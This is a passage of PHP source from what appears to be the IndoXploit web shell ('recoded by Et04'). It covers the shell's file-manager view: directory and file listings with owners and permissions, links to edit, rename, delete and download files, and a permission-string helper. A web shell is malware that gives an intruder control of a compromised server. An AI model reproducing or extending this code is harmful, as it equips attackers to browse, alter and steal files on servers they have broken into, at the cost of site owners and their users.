      $scandir = scandir($dir);
      foreach($scandir as $dirx) {
        $dtype = filetype("$dir/$dirx");
        $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
        if(function_exists('posix_getpwuid')) {
          $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
          $downer = $downer['name'];
        } else {
          //$downer = $uid;
          $downer = fileowner("$dir/$dirx");
        }
        if(function_exists('posix_getgrgid')) {
          $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
          $dgrp = $dgrp['name'];
        } else {
          $dgrp = filegroup("$dir/$dirx");
        }
        if(!is_dir("$dir/$dirx")) continue;
        if($dirx === '..') {
          $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
        } elseif($dirx === '.') {
          $href = "<a href='?dir=$dir'>$dirx</a>";
        } else {
          $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
        }
        if($dirx === '.' || $dirx === '..') {
          $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
          } else {
          $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
        }
        echo "<tr>";
        echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
        echo "<td class='td_home'><center>$dtype</center></td>";
        echo "<td class='td_home'><center>-</center></th></td>";
        echo "<td class='td_home'><center>$dtime</center></td>";
        echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
        echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
        echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
        echo "</tr>";
      }
    }
  } else {
    echo "<font color=red>can't open directory.</font>";
  }
    foreach($scandir as $file) {
      $ftype = filetype("$dir/$file");
      $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
      $size = filesize("$dir/$file")/1024;
      $size = round($size,3);
      if(function_exists('posix_getpwuid')) {
        $fowner = @posix_getpwuid(fileowner("$dir/$file"));
        $fowner = $fowner['name'];
      } else {
        //$downer = $uid;
        $fowner = fileowner("$dir/$file");
      }
      if(function_exists('posix_getgrgid')) {
        $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
        $fgrp = $fgrp['name'];
      } else {
        $fgrp = filegroup("$dir/$file");
      }
      if($size > 1024) {
        $size = round($size/1024,2). 'MB';
      } else {
        $size = $size. 'KB';
      }
      if(!is_file("$dir/$file")) continue;
      echo "<tr>";
      echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
      echo "<td class='td_home'><center>$ftype</center></td>";
      echo "<td class='td_home'><center>$size</center></td>";
      echo "<td class='td_home'><center>$ftime</center></td>";
      echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
      echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
      echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
      echo "</tr>";
    }
    echo "</table>";
    if(!is_readable($dir)) {
      //
    } else {
      echo "<hr>";
    }
  echo "<center><br><div>&#1203;&#824;&#1202;&#824;&#1203; <b>IndoXploit</b> recoded by <b>Et04</b> &#1203;&#824;&#1202;&#824;&#1203;</div>";
  echo "<hr>";
  echo "<center>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/IndonesianCodeParty/' target='_blank'><font color=#00ff12>Indonesian Code Party</font></a></center>";

}
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>